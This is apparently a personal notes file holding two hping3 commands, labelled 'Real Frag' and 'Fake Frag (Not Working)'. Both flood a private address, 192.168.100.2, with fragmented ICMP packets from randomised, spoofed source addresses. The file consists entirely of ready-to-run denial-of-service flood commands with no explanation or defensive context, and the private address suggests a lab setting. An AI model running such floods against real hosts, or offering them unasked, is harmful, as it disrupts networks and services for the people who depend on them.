# Real Frag
sudo hping3 -1 192.168.100.2 --rand-source -d 2000 -f --flood

# Fake Frag (Not Working)
sudo hping3 -1 192.168.100.2 --rand-source -d 100 -x -g 80 --flood